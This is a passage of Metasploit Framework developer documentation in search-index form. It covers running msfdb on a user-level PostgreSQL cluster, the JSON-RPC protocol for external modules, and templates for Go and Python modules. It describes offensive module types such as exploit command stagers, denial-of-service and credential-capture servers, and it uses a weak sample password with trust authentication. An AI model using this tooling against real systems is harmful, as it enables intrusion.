5433","title":"Requirements"},{"location":"dev/dark/Work-needed-to-allow-msfdb-to-use-postgresql-common/#notes","text":"Debian's postgresql-common (Multi-Version/Multi-Cluster PostgreSQL architecture) contains PostgreSQL wrapper tools: pg_lsclusters : list all available clusters with their status and configuration pg_createcluster : wrapper for initdb , sets up the necessary configuration structure pg_createcluster [options] version name [-- initdb options] pg_ctlcluster : wrapper for pg_ctl , control the cluster postgres server pg_ctlcluster [options] cluster-version cluster-name action -- [pg_ctl options] where action = start|stop|restart|reload|promote pg_dropcluster : remove a cluster and its configuration pg_dropcluster [--stop] cluster-version cluster-name pg_wrapper : wrapper for PostgreSQL client commands client-program [--cluster version/cluster] [...] ( client-program: psql, createdb, dropuser, and all other client programs installed in /usr/lib/postgresql/ version/bin). The \"database cluster\" simply refers to a set of databases on a single server rather than a group of multiple database servers.","title":"Notes"},{"location":"dev/dark/Work-needed-to-allow-msfdb-to-use-postgresql-common/#manually-create-and-initialize-msf-database-using-postgresql-common","text":"","title":"Manually create and initialize MSF database using postgresql-common"},{"location":"dev/dark/Work-needed-to-allow-msfdb-to-use-postgresql-common/#issues","text":"Encountered permissions issues when attempting to create a cluster. pg_createcluster --user=$(whoami) --encoding=UTF8 9.6 msf -- --username=$(whoami) --auth-host=trust --auth-local=trust install: cannot change permissions of \u2018/etc/postgresql/9.6/msf\u2019: No such file or directory Error: could not create configuration directory; you might need to run this program with root privileges Requiring root privileges may be prohibitive to user installs of MSF. How can we create a cluster without root privileges? Adding the user to the postgres group and attempting to sudo -u postgres the command, however, resulted in the same error message. Looking closer at the various commands and discovered the following in the man page for pg_wrapper . PG_CLUSTER_CONF_ROOT This specifies an alternative base directory for cluster configurations. This is usually /etc/postgresql/, but for testing/development purposes you can change this to point to e. g. your home directory, so that you can use the postgresql-common tools without root privileges.","title":"Issues"},{"location":"dev/dark/Work-needed-to-allow-msfdb-to-use-postgresql-common/#working-solution","text":"Create cluster (\"initdb\") to set up the necessary configuration structure: Note, running mkdir -p $HOME/.local/etc/postgresql; before the pg_createcluster command didn't stop the \"install: cannot change owner and permissions of \u2018/home/msfdev/.local/etc/postgresql/9.6\u2019: Operation not permitted\" message from appearing. This appears to be a warning only and doesn't seem to affect cluster creation. mkdir -p $HOME/.local/var/log/postgresql; PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_createcluster --user=$(whoami) --datadir=$HOME/msf-db-datadir --socketdir=$HOME/.local/var/run/postgresql --logfile=$HOME/.local/var/log/postgresql/postgresql-version-msf.log --encoding=UTF8 9.6 msf -- --username=$(whoami) --auth-host=trust --auth-local=trust install: cannot change owner and permissions of \u2018/home/msfdev/.local/etc/postgresql/9.6\u2019: Operation not permitted Creating new cluster 9.6/msf ... config /home/msfdev/.local/etc/postgresql/9.6/msf data /home/msfdev/msf-db-datadir locale en_US.UTF-8 socket /home/msfdev/.local/var/run/postgresql port 5433 Check cluster was successfully created and appears in the list of all available clusters: PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_lsclusters Ver Cluster Port Status Owner Data directory Log file 9.6 msf 5433 down msfdev /home/msfdev/msf-db-datadir /home/msfdev/.local/var/log/postgresql/postgresql-version-msf.log Start postmaster server for the cluster (\"pg_ctl\"): PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_ctlcluster 9.6 msf start Check that the cluster was successfully started: PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_lsclusters Ver Cluster Port Status Owner Data directory Log file 9.6 msf 5433 online msfdev /home/msfdev/msf-db-datadir /home/msfdev/.local/var/log/postgresql/postgresql-version-msf.log Perform msfdb 's write_db_config method work by manually creating the ~/.msf4/database.yml file. development: &pgsql adapter: postgresql database: msf username: msf password: Password123 host: 127.0.0.1 port: 5433 pool: 200 production: &production <<: *pgsql test: <<: *pgsql database: msftest username: msftest password: Password123 Create database users: Note, these steps are from msfdb 's init_db method. The following example only creates the main MSF user account and not the test account. PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql psql --cluster 9.6/msf -c \"create user msf with password 'Password123';\" postgres CREATE ROLE PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql psql --cluster 9.6/msf -c \"alter role msf createdb;\" postgres ALTER ROLE PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql psql --cluster 9.6/msf -c \"alter role msf with password 'Password123';\" postgres ALTER ROLE PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql createdb --cluster 9.6/msf -O msf -h 127.0.0.1 -U msf -E UTF-8 -T template0 msf Perform msfdb 's write_db_client_auth_config method work, except it needs to write the pg_hba.conf file now stored in under PG_CLUSTER_CONF_ROOT and inside the version/cluster-name directory. In this example that location is: $HOME/.local/etc/postgresql/9.6/msf/pg_hba.conf . Perform msfdb 's restart_db method work, by stopping and then starting the server. Stop and then start postmaster server for the cluster (\"pg_ctl\"): PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_ctlcluster 9.6 msf stop PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_ctlcluster 9.6 msf start Check that the cluster was successfully started: PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_lsclusters Ver Cluster Port Status Owner Data directory Log file 9.6 msf 5433 online msfdev /home/msfdev/msf-db-datadir /home/msfdev/.local/var/log/postgresql/postgresql-version-msf.log Create initial database schema: Note, these steps are from msfdb 's init_db method. cd ~/metasploit-framework bundle exec rake db:migrate Start msfconsole and verify postgresql connection using the db_status command: # disable or remove ~/.msf4/config if it is configured to auto connect to a data service mv ~/.msf4/config ~/.msf4/config.disable ./msfconsole ... msf5 > db_status [*] Connected to msf. Connection type: postgresql. Drop (delete) the cluster: PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_dropcluster 9.6 msf","title":"Working Solution"},{"location":"dev/dark/Writing-External-GoLang-Modules/","text":"Contributing modules in GO can be achieved in a few simple steps as outlined below. As for supported GO version, we have tested with 1.11.2, no promised for version 2. 1. Location Select the appropriate module path based on the type of module you are trying to contribute Be sure to include appropriate module documentation under here Test your documentation is correct by executing info -d 2. Execution Include this line at the top of your module: //usr/bin/env go run \"$0\" \"$@\"; exit \"$?\" Ensure your file is an executable file 3. Setup Initialize your module with the module metadata: import \"metasploit/module\" func main() { metadata := &module.Metadata{ Name: \"<module name\", Description: \"<describe>\", Authors: []string{\"<author 1>\", \"<author 2>\"}, Date: \"<date module written\", Type:\"<module type>\", Privileged: <true|false>, References: []module.Reference{}, Options: map[string]module.Option{ \"<option 1\": {Type: \"<type>\", Description: \"<description>\", Required: <true|false>, Default: \"<default>\"}, \"<option 2\": {Type: \"<type>\", Description: \"<description>\", Required: <true|false>, Default: \"<default>\"}, }} module.Init(metadata, ) } FULL EXAMPLE Note: Above does not outline the full potential list of metadata options Currently supported module types : * remote_exploit * remote_exploit_cmd_stager * capture_server * dos * single_scanner * single_host_login_scanner * multi_scanner 4. Shared Code For code that is shared specific to your module create a directory in your module directory: shared/src/ metasploit will automatically add these to the GOPATH For code that you think could be used across modules, add code here 3 rd party libs aren't currently supported but we welcome patches 5. Finalize Test your Pull Request Create a Pull Request No coding standard here, be sure to gofmt","title":"Writing External GoLang Modules"},{"location":"dev/dark/Writing-External-GoLang-Modules/#1-location","text":"Select the appropriate module path based on the type of module you are trying to contribute Be sure to include appropriate module documentation under here Test your documentation is correct by executing info -d","title":"1. Location"},{"location":"dev/dark/Writing-External-GoLang-Modules/#2-execution","text":"Include this line at the top of your module: //usr/bin/env go run \"$0\" \"$@\"; exit \"$?\" Ensure your file is an executable file","title":"2. Execution"},{"location":"dev/dark/Writing-External-GoLang-Modules/#3-setup","text":"Initialize your module with the module metadata: import \"metasploit/module\" func main() { metadata := &module.Metadata{ Name: \"<module name\", Description: \"<describe>\", Authors: []string{\"<author 1>\", \"<author 2>\"}, Date: \"<date module written\", Type:\"<module type>\", Privileged: <true|false>, References: []module.Reference{}, Options: map[string]module.Option{ \"<option 1\": {Type: \"<type>\", Description: \"<description>\", Required: <true|false>, Default: \"<default>\"}, \"<option 2\": {Type: \"<type>\", Description: \"<description>\", Required: <true|false>, Default: \"<default>\"}, }} module.Init(metadata, ) } FULL EXAMPLE Note: Above does not outline the full potential list of metadata options Currently supported module types : * remote_exploit * remote_exploit_cmd_stager * capture_server * dos * single_scanner * single_host_login_scanner * multi_scanner","title":"3. Setup"},{"location":"dev/dark/Writing-External-GoLang-Modules/#4-shared-code","text":"For code that is shared specific to your module create a directory in your module directory: shared/src/ metasploit will automatically add these to the GOPATH For code that you think could be used across modules, add code here 3 rd party libs aren't currently supported but we welcome patches","title":"4. Shared Code"},{"location":"dev/dark/Writing-External-GoLang-Modules/#5-finalize","text":"Test your Pull Request Create a Pull Request No coding standard here, be sure to gofmt","title":"5. Finalize"},{"location":"dev/dark/Writing-External-Metasploit-Modules/","text":"For an introduction to the reasons and goals for external modules, see our 2017 HaXmas post on the subject . Request Flow Each time Metasploit wants an external module to do something (ex. describe itself or run with a certain configuration), it runs the module in a new process and talks to it over stdin/stdout. To get the metadata from a module (which includes options), the call sequence looks a bit like: +------------+ | Metasploit | | | Describe yourself +-------------------+ | +-------------------> | some_module.py | | | | | | | | | | | Some metadata | | | | <-------------------+ | | | | | | | +-------------------+ | | | | +------------+ A module run might look like: +------------+ | Metasploit | Do a thing with | | these options +-------------------+ | +-------------------> | some_module.py | | | | | | | | | | | A bit of status | | | | <-------------------+ | | | | | | | Moar status | | | | <-------------------+ | | | | | | | I found a thing | | | | <-------------------+ | | | | | | | +-------------------+ | | +------------+ When a module meant for a single host is run against a range of hosts, Metasploit will start a new process for each host. If the THREADS datastore option is set and it is an auxiliary module, that many processes will be run at the same time. JSON-RPC API External modules communicate with Metasploit over stdin/stdout. The methods a module must implement are describe and run ; additional methods can be advertised in the capabilities array, for now assumed to use a subset of the options used for run . Metasploit implements message and will implement report in the near future. The specs for each method are written below using JSON-schema . Work still needs to be done enumerating valid types and codes for the messages. Describe Request { \"$schema\" : \"http://json-schema.org/schema#\" , \"type\" : \"object\" , \"required\" : [ \"params\" , \"method\" , \"jsonrpc\" , \"id\" ], \"properties\" : { \"jsonrpc\" : { \"enum\" : [ \"2.0\" ]}, \"id\" : { \"type\" : \"string\" }, \"method\" : { \"enum\" : [ \"describe\" ]}, \"params\" : { \"type\" : \"object\" } } } Response { \"$schema\" : \"http://json-schema.org/schema#\" , \"type\" : \"object\" , \"required\" : [ \"jsonrpc\" , \"result\" , \"id\" ], \"properties\" : { \"jsonrpc\" : { \"enum\" : [ \"2.0\" ]}, \"id\" : { \"type\" : \"string\" }, \"result\" : { \"type\" : \"object\" , \"required\" : [ \"name\" , \"description\" , \"authors\" , \"type\" , \"options\" , \"capabilities\" ], \"properties\" : { \"name\" : { \"type\" : \"string\" }, \"description\" : { \"type\" : \"string\" }, \"authors\" : { \"type\" : \"array\" , \"items\" : { \"type\" : \"string\" }}, \"date\" : { \"type\" : \"string\" }, \"references\" : { \"type\" : \"array\" , \"items\" : { \"type\" : \"object\" , \"required\" : [ \"type\" , \"ref\" ], \"properties\" : { \"type\" : { \"type\" : \"string\" }, \"ref\" : { \"type\" : \"string\" } } } }, \"type\" : { \"enum\" : [ \"remote_exploit.cmd_stager.wget\" ]}, \"privileged\" : { \"type\" : \"boolean\" }, \"targets\" : { \"type\" : \"array\" , \"items\" : { \"type\" : \"object\" , \"required\" : [ \"platform\" , \"arch\" ], \"properties\" : { \"platform\" : { \"type\" : \"string\" }, \"arch\" : { \"type\" : \"string\" } } } }, \"options\" : { \"type\" : \"object\" , \"additionalProperties\" : false , \"patternProperties\" : { \"^[^=]*$\" : { \"type\" : \"object\" , \"required\" : [ \"type\" , \"description\" , \"required\" , \"default\" ], \"properties\" : { \"required\" : { \"type\" : \"boolean\" }, \"default\" : { \"type\" : [ \"null\" , \"string\" , \"number\" , \"boolean\" , \"object\" , \"array\" ]}, \"description\" : { \"type\" : \"string\" }, \"type\" : { \"type\" : \"string\" } } } } }, \"capabilities\" : { \"type\" : \"array\" , \"items\" : { \"type\" : \"string\" } } } } } } Run Request { \"$schema\" : \"http://json-schema.org/schema#\" , \"type\" : \"object\" , \"required\" : [ \"params\" , \"method\" , \"jsonrpc\" , \"id\" ], \"properties\" : { \"jsonrpc\" : { \"enum\" : [ \"2.0\" ]}, \"id\" : { \"type\" : \"string\" }, \"method\" : { \"enum\" : [ \"run\" ]}, \"params\" : { \"type\" : \"object\" \"additionalProperties\" : false , \"patternProperties\" : { \"^[^=]*$\" : { \"type\" : \"object\" , \"required\" : [ \"type\" , \"description\" , \"required\" , \"default\" ], \"properties\" : { \"required\" : { \"type\" : \"boolean\" }, \"default\" : { \"type\" : [ \"null\" , \"string\" , \"number\" , \"boolean\" , \"object\" , \"array\" ]}, \"description\" : { \"type\" : \"string\" }, \"type\" : { \"type\" : \"string\" } } } } } } } Response { \"$schema\" : \"http://json-schema.org/schema#\" , \"type\" : \"object\" , \"required\" : [ \"jsonrpc\" , \"id\" ], \"properties\" : { \"jsonrpc\" : { \"enum\" : [ \"2.0\" ]}, \"id\" : { \"type\" : \"string\" }, \"result\" : { \"type\" : \"object\" , \"required\" : [ \"message\" ] \"properties\" : { \"message\" : { \"type\" : \"string\" }, \"return\" : { \"type\" : \"string\" } } }, \"error\" : { \"type\" : \"object\" , \"required\" : [ \"message\" , \"code\" ], \"properties\" : { \"message\" : { \"type\" : \"string\" }, \"code\" : { \"type\" : \"number\" }, \"data\" : { \"type\" : \"object\" } } } } } Message Notification - no response { \"$schema\" : \"http://json-schema.org/schema#\" , \"type\" : \"object\" , \"required\" : [ \"params\" , \"method\" , \"jsonrpc\" ], \"properties\" : { \"jsonrpc\" : { \"enum\" : [ \"2.0\" ]}, \"method\" : { \"enum\" : [ \"message\" ]}, \"params\" : { \"type\" : \"object\" , \"required\" : [ \"level\" , \"message\" ], \"properties\" : { \"level\" : { \"enum\" : [ \"error\" , \"good\" , \"warning\" , \"info\" , \"debug\" ]}, \"message\" : { \"type\" : \"string\" } } } } }","title":"Writing External Metasploit Modules"},{"location":"dev/dark/Writing-External-Metasploit-Modules/#request-flow","text":"Each time Metasploit wants an external module to do something (ex. describe itself or run with a certain configuration), it runs the module in a new process and talks to it over stdin/stdout. To get the metadata from a module (which includes options), the call sequence looks a bit like: +------------+ | Metasploit | | | Describe yourself +-------------------+ | +-------------------> | some_module.py | | | | | | | | | | | Some metadata | | | | <-------------------+ | | | | | | | +-------------------+ | | | | +------------+ A module run might look like: +------------+ | Metasploit | Do a thing with | | these options +-------------------+ | +-------------------> | some_module.py | | | | | | | | | | | A bit of status | | | | <-------------------+ | | | | | | | Moar status | | | | <-------------------+ | | | | | | | I found a thing | | | | <-------------------+ | | | | | | | +-------------------+ | | +------------+ When a module meant for a single host is run against a range of hosts, Metasploit will start a new process for each host. If the THREADS datastore option is set and it is an auxiliary module, that many processes will be run at the same time.","title":"Request Flow"},{"location":"dev/dark/Writing-External-Metasploit-Modules/#json-rpc-api","text":"External modules communicate with Metasploit over stdin/stdout. The methods a module must implement are describe and run ; additional methods can be advertised in the capabilities array, for now assumed to use a subset of the options used for run . Metasploit implements message and will implement report in the near future. The specs for each method are written below using JSON-schema . Work still needs to be done enumerating valid types and codes for the messages.","title":"JSON-RPC API"},{"location":"dev/dark/Writing-External-Metasploit-Modules/#describe","text":"Request { \"$schema\" : \"http://json-schema.org/schema#\" , \"type\" : \"object\" , \"required\" : [ \"params\" , \"method\" , \"jsonrpc\" , \"id\" ], \"properties\" : { \"jsonrpc\" : { \"enum\" : [ \"2.0\" ]}, \"id\" : { \"type\" : \"string\" }, \"method\" : { \"enum\" : [ \"describe\" ]}, \"params\" : { \"type\" : \"object\" } } } Response { \"$schema\" : \"http://json-schema.org/schema#\" , \"type\" : \"object\" , \"required\" : [ \"jsonrpc\" , \"result\" , \"id\" ], \"properties\" : { \"jsonrpc\" : { \"enum\" : [ \"2.0\" ]}, \"id\" : { \"type\" : \"string\" }, \"result\" : { \"type\" : \"object\" , \"required\" : [ \"name\" , \"description\" , \"authors\" , \"type\" , \"options\" , \"capabilities\" ], \"properties\" : { \"name\" : { \"type\" : \"string\" }, \"description\" : { \"type\" : \"string\" }, \"authors\" : { \"type\" : \"array\" , \"items\" : { \"type\" : \"string\" }}, \"date\" : { \"type\" : \"string\" }, \"references\" : { \"type\" : \"array\" , \"items\" : { \"type\" : \"object\" , \"required\" : [ \"type\" , \"ref\" ], \"properties\" : { \"type\" : { \"type\" : \"string\" }, \"ref\" : { \"type\" : \"string\" } } } }, \"type\" : { \"enum\" : [ \"remote_exploit.cmd_stager.wget\" ]}, \"privileged\" : { \"type\" : \"boolean\" }, \"targets\" : { \"type\" : \"array\" , \"items\" : { \"type\" : \"object\" , \"required\" : [ \"platform\" , \"arch\" ], \"properties\" : { \"platform\" : { \"type\" : \"string\" }, \"arch\" : { \"type\" : \"string\" } } } }, \"options\" : { \"type\" : \"object\" , \"additionalProperties\" : false , \"patternProperties\" : { \"^[^=]*$\" : { \"type\" : \"object\" , \"required\" : [ \"type\" , \"description\" , \"required\" , \"default\" ], \"properties\" : { \"required\" : { \"type\" : \"boolean\" }, \"default\" : { \"type\" : [ \"null\" , \"string\" , \"number\" , \"boolean\" , \"object\" , \"array\" ]}, \"description\" : { \"type\" : \"string\" }, \"type\" : { \"type\" : \"string\" } } } } }, \"capabilities\" : { \"type\" : \"array\" , \"items\" : { \"type\" : \"string\" } } } } } }","title":"Describe"},{"location":"dev/dark/Writing-External-Metasploit-Modules/#run","text":"Request { \"$schema\" : \"http://json-schema.org/schema#\" , \"type\" : \"object\" , \"required\" : [ \"params\" , \"method\" , \"jsonrpc\" , \"id\" ], \"properties\" : { \"jsonrpc\" : { \"enum\" : [ \"2.0\" ]}, \"id\" : { \"type\" : \"string\" }, \"method\" : { \"enum\" : [ \"run\" ]}, \"params\" : { \"type\" : \"object\" \"additionalProperties\" : false , \"patternProperties\" : { \"^[^=]*$\" : { \"type\" : \"object\" , \"required\" : [ \"type\" , \"description\" , \"required\" , \"default\" ], \"properties\" : { \"required\" : { \"type\" : \"boolean\" }, \"default\" : { \"type\" : [ \"null\" , \"string\" , \"number\" , \"boolean\" , \"object\" , \"array\" ]}, \"description\" : { \"type\" : \"string\" }, \"type\" : { \"type\" : \"string\" } } } } } } } Response { \"$schema\" : \"http://json-schema.org/schema#\" , \"type\" : \"object\" , \"required\" : [ \"jsonrpc\" , \"id\" ], \"properties\" : { \"jsonrpc\" : { \"enum\" : [ \"2.0\" ]}, \"id\" : { \"type\" : \"string\" }, \"result\" : { \"type\" : \"object\" , \"required\" : [ \"message\" ] \"properties\" : { \"message\" : { \"type\" : \"string\" }, \"return\" : { \"type\" : \"string\" } } }, \"error\" : { \"type\" : \"object\" , \"required\" : [ \"message\" , \"code\" ], \"properties\" : { \"message\" : { \"type\" : \"string\" }, \"code\" : { \"type\" : \"number\" }, \"data\" : { \"type\" : \"object\" } } } } }","title":"Run"},{"location":"dev/dark/Writing-External-Metasploit-Modules/#message","text":"Notification - no response { \"$schema\" : \"http://json-schema.org/schema#\" , \"type\" : \"object\" , \"required\" : [ \"params\" , \"method\" , \"jsonrpc\" ], \"properties\" : { \"jsonrpc\" : { \"enum\" : [ \"2.0\" ]}, \"method\" : { \"enum\" : [ \"message\" ]}, \"params\" : { \"type\" : \"object\" , \"required\" : [ \"level\" , \"message\" ], \"properties\" : { \"level\" : { \"enum\" : [ \"error\" , \"good\" , \"warning\" , \"info\" , \"debug\" ]}, \"message\" : { \"type\" : \"string\" } } } } }","title":"Message"},{"location":"dev/dark/Writing-External-Python-Modules/","text":"Writing Python Modules for Metasploit This is an example of how to write a Python module for Metasploit Framework that uses a Python metasploit library to communicate with framework via JSON-RPC over stdin/stdout. Python Library The library currently supports a few function calls that can be used to report information to Metasploit Framework. The metasploit library can be loaded into your Python module by including the following line: from metasploit import module The location of the metasploit library is automatically added to the PYTHONPATH environment variable before the Python module is executed. Describe Yourself Metasploit modules include information about authors of the modules, references to other sources with information about the vulnerabilities, descriptions of the modules, options, etc. Python modules need to include this metadata information as well. The structure of the data is similar to modules written in Ruby. The following is an example template of metadata information: metadata = { 'name' : '<name>' , 'description' : ''' <description> ''' , 'authors' : [ '<author>' , '<author>' ], 'date' : 'YYYY-MM-DD' , 'license' : '<license>' , 'references' : [ { 'type' : 'url' , 'ref' : '<url>' }, { 'type' : 'cve' , 'ref' : 'YYYY-#' }, { 'type' : 'edb' , 'ref' : '#' }, { 'type' : 'aka' , 'ref' : '<name>' } ], 'type' : '<module type>' , 'options' : { '<name>' : { 'type' : 'address' , 'description' : '<description>' , 'required' : < True / False > , 'default' : None }, '<name>' : { 'type' : 'string' , 'description' : '<description>' , 'required' : < True / False > , 'default' : None }, '<name>' : { 'type' : 'string' , 'description' : '<description>' , 'required' : < True / False > , 'default' : None } } } Module Type As shown in the metadata template information, a type is also include for the module. The module type is used to select an ERB template, which generates a Ruby document for the module. The ERB templates can be found here . The following templates are currently available: remote_exploit_cmd_stager capture_server dos single_scanner multi_scanner The remote_exploit_cmd_stager module type is used when writing an exploit for command execution or code injection vulnerabilities and provides the command to inject into the vulnerable code based on the flavor specified for the command stager. The capture_server module type is used when a module is designed to simulate a service to capture credentials for connecting clients. The dos module type is used when the module will send packets to a remote service that will crash the service or put it in an unusable state. The single_scanner module type is used when creating a module to scan hosts without batching. The multi_scanner module type is used for modules that are going to scan hosts in batches. The batch_size option is registered in the mutli_scanner ERB template with a default of 200. Options The options dictionary in the metadata are the options that will be available in msfconsole when the module is loaded. The options can be required (necessary for the module to run) or not (provide additional functionality). Communication To pass the metadata information, as well as the starting function of your Python module, to msfconsole, use the module.run() function. The module.run() function takes two arguments, the first is the metadata and the second is the callback function to use when executing the module from msfconsole. The code snippet will look like the following: def run ( args ): # Your code here pass if __name__ == '__main__' : module . run ( metadata , run ) When msfconsole sends a describe request to the Python module, the metadata information is returned. When msfconsole sends a run request to the module, the callback function, run in this example, will be called with the arguments provided to msfconsole. A LogHandler can be setup and used to communicate status information back to framework during execution of the Python module. Here is code snippet that uses the LogHandler: import logging from metasploit import module module . LogHandler . setup ( msg_prefix = 'logging test: ' ) logging . info ( 'info' ) logging . error ( 'error' ) logging . warning ( 'warning' ) logging . debug ( 'debug' ) The module.LogHandler.setup() function is used the create a Handler and Formatter that will call module.log() with the appropriate log level. Full Example #!/usr/bin/env python3 # -*- coding: utf-8 -*- # standard modules import logging # extra modules dependencies_missing = False try : import requests except ImportError : dependencies_missing = True from metasploit import module metadata = { 'name' : 'Python Module Example' , 'description' : ''' Python communication with msfconsole. ''' , 'authors' : [ 'Jacob Robles' ], 'date' : '2018-03-22' , 'license' : 'MSF_LICENSE' , 'references' : [ { 'type' : 'url' , 'ref' : 'https://blog.rapid7.com/2017/12/28/regifting-python-in-metasploit/' }, { 'type' : 'aka' , 'ref' : 'Coldstone' } ], 'type' : 'single_scanner' , 'options' : { 'targeturi' : { 'type' : 'string' , 'description' : 'The base path' , 'required' : True , 'default' : '/' }, 'rhost' : { 'type' : 'address' , 'description' : 'Target address' , 'required' : True , 'default' : None } } } def run ( args ): module . LogHandler . setup ( msg_prefix = '{} - ' . format ( args [ 'rhost' ])) if dependencies_missing : logging . error ( 'Module dependency (requests) is missing, cannot continue' ) return # Your code here try : r = requests . get ( 'https://{}/{}' . format ( args [ 'rhost' ], args [ 'targeturi' ]), verify = False ) except requests . exceptions . RequestException as e : logging . error ( '{}' . format ( e )) return logging . info ( '{}...' . format ( r . text [ 0 : 50 ])) if __name__ == '__main__' : module . run ( metadata , run ) The example sends a get request to the given rhost and targeturi , then calls logging.info() on the result to have the output displayed in msfconsole. Coding with Style All the Python code in Metasploit aims to be PEP 8 compliant. The biggest differences coming from Metasploit's Ruby style: * Two lines between functions (but not class methods) * Two lines between different types of code (like imports and the metadata, see above) * Four spaces for indenting Some coding choices to think about when writing your module: * Prefer \"foo {}\".format('bar') over interpolation with % * Keep your callback methods short and readable. If it gets cluttered, break out sub-tasks into well-named functions * Variable names should be descriptive, readable, and short ( a guide ) * If you really need Python3 features in your module, use #!/usr/bin/env python3 for the shebang * If you have a lot of legacy code in 2.7 or need a 2.7 library, use #!/usr/bin/env python2.7 (macOS in particular does not ship with a python2 executable by default) * If possible, have your module compatible with both and use #!/usr/bin/env python (Potentially) Common Questions Why doesn't the module appear when I search for it in msfconsole? The module may have errors and fail to load inside of msfconsole. Check the framework log file, ~/.msf4/logs/framework.log , for error messages. Also, if the module is not marked as executable, then it will not show up when you search for it in msfconsole. Why is the output from the Python module not showing up in msfconsole? The external modules communicate with framework via JSON-RPC. If your Python module contains print statements, framework may not recognize those as JSON-RPC requests. Use the LogHandler or module.log() to send status information, which will be displayed in msfconsole. Additional Resources Rapid7 Blog: Regifting Python in Metasploit Rapid7 Blog: External Metasploit Modules: The Gift That Keeps On Slithering Metasploit Python library ERB Templates","title":"Writing Python Modules for Metasploit"},{"location":"dev/dark/Writing-External-Python-Modules/#writing-python-modules-for-metasploit","text":"This is an example of how to write a Python module for Metasploit Framework that uses a Python metasploit library to communicate with framework via JSON-RPC over stdin/stdout.","title":"Writing Python Modules for Metasploit"},{"location":"dev/dark/Writing-External-Python-Modules/#python-library","text":"The library currently supports a few function calls that can be used to report information to Metasploit Framework. The metasploit library can be loaded into your Python module by including the following line: from metasploit import module The location of the metasploit library is automatically added to the PYTHONPATH environment variable before the Python module is executed.","title":"Python Library"},{"location":"dev/dark/Writing-External-Python-Modules/#describe-yourself","text":"Metasploit modules include information about authors of the modules, references to other sources with information about the vulnerabilities, descriptions of the modules, options, etc. Python modules need to include this metadata information as well. The structure of the data is similar to modules written in Ruby. The following is an example template of metadata information: metadata = { 'name' : '<name>' , 'description' : ''' <description> ''' , 'authors' : [ '<author>' , '<author>' ], 'date' : 'YYYY-MM-DD' , 'license' : '<license>' , 'references' : [ { 'type' : 'url' , 'ref' : '<url>' }, { 'type' : 'cve' , 'ref' : 'YYYY-#' }, { 'type' : 'edb' , 'ref' : '#' }, { 'type' : 'aka' , 'ref' : '<name>' } ], 'type' : '<module type>' , 'options' : { '<name>' : { 'type' : 'address' , 'description' : '<description>' , 'required' : < True / False > , 'default' : None }, '<name>' : { 'type' : 'string' , 'description' : '<description>' , 'required' : < True / False > , 'default' : None }, '<name>' : { 'type' : 'string' , 'description' : '<description>' , 'required' : < True / False > , 'default' : None } } }","title":"Describe Yourself"},{"location":"dev/dark/Writing-External-Python-Modules/#module-type","text":"As shown in the metadata template information, a type is also include for the module. The module type is used to select an ERB template, which generates a Ruby document for the module. The ERB templates can be found here . The following templates are currently available: remote_exploit_cmd_stager capture_server dos single_scanner multi_scanner The remote_exploit_cmd_stager module type is used when writing an exploit for command execution or code injection vulnerabilities and provides the command to inject into the vulnerable code based on the flavor specified for the command stager. The capture_server module type is used when a module is designed to simulate a service to capture credentials for connecting clients. The dos module type is used when the module will send packets to a remote service that will crash the service or put it in an unusable state. The single_scanner module type is used when creating a module to scan hosts without batching. The multi_scanner module type is used for modules that are going to scan hosts in batches. The batch_size option is registered in the mutli_scanner ERB template with a default of 200.","title":"Module Type"},{"location":"dev/dark/Writing-External-Python-Modules/#options","text":"The options dictionary in the metadata are the options that will be available in msfconsole when the module is loaded. The options can be required (necessary for the module to run) or not (provide additional functionality).","title":"Options"},{"location":"dev/dark/Writing-External-Python-Modules/#communication","text":"To pass the metadata information, as well as the starting function of your Python module, to msfconsole, use the module.run() function. The module.run() function takes two arguments, the first is the metadata and the second is the callback function to use when executing the module from msfconsole. The code snippet will look like the following: def run ( args ): # Your code here pass if __name__ == '__main__' : module . run ( metadata , run ) When msfconsole sends a describe request to the Python module, the metadata information is returned. When msfconsole sends a run request to the module, the callback function, run in this example, will be called with the arguments provided to msfconsole. A LogHandler can be setup and used to communicate status information back to framework during execution of the Python module. Here is code snippet that uses the LogHandler: import logging from metasploit import module module . LogHandler . setup ( msg_prefix = 'logging test: ' ) logging . info ( 'info' ) logging . error ( 'error' ) logging . warning ( 'warning' ) logging . debug ( 'debug' ) The module.LogHandler.setup() function is used the create a Handler and Formatter that will call module.log() with the appropriate log level.","title":"Communication"},{"location":"dev/dark/Writing-External-Python-Modules/#full-example","text":"#!/usr/bin/env python3 # -*- coding: utf-8 -*- # standard modules import logging # extra modules dependencies_missing = False try : import requests except ImportError : dependencies_missing = True from metasploit import module metadata = { 'name' : 'Python Module Example' , 'description' : ''' Python communication with msfconsole. ''' , 'authors' : [ 'Jacob Robles' ], 'date' : '2018-03-22' , 'license' : 'MSF_LICENSE' , 'references' : [ { 'type' : 'url' , 'ref' : 'https://blog.rapid7.com/2017/12/28/regifting-python-in-metasploit/' }, { 'type' : 'aka' , 'ref' : 'Coldstone' } ], 'type' : 'single_scanner' , 'options' : { 'targeturi' : { 'type' : 'string' , 'description' : 'The base path' , 'required' : True , 'default' : '/' }, 'rhost' : { 'type' : 'address' , 'description' : 'Target address' , 'required' : True , 'default' : None } } } def run ( args ): module . LogHandler . setup ( msg_prefix = '{} - ' . format ( args [ 'rhost' ])) if dependencies_missing : logging . error ( 'Module dependency (requests) is missing, cannot continue' ) return # Your code here try : r = requests . get ( 'https://{}/{}' . format ( args [ 'rhost' ], args [ 'targeturi' ]), verify = False ) except requests . exceptions . RequestException as e : logging . error ( '{}' . format ( e )) return logging . info ( '{}...' . format ( r . text [ 0 : 50 ])) if __name__ == '__main__' : module . run ( metadata , run ) The example sends a get request to the given rhost and targeturi , then calls logging.info() on the result to have the output displayed in msfconsole.","title":"Full Example"},{"location":"dev/dark/Writing-External-Python-Modules/#coding-with-style","text":"All the Python code in Metasploit aims to be PEP 8 compliant. The biggest differences coming from Metasploit's Ruby style: * Two lines between functions (but not class 